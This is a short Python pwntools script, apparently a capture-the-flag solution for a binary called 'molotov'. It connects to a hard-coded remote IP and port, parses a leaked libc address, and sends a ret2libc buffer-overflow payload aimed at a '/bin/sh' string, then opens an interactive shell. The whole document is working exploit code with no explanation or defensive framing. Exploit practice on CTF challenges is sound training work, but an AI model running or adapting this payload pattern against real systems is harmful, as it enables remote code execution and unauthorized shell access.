#!/usr/bin/env python3

from pwn import *

exe = ELF("./molotov")

context.binary = exe


def conn():
        return process([exe.path])


def main():
#    r = conn()
    r = remote("54.210.217.206", 1240)
    
    LEAK = int(b"0x"+r.recvline(), 16)
    log.info("Libc leak @ 0x%x", LEAK)

    BinSh = LEAK + 0x14ab7d

    payload = cyclic_metasploit(28 + 4)
    payload += p32(LEAK)
    payload += b"M"*4
    payload += p32(BinSh)


    r.recvline()
    pause()
    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
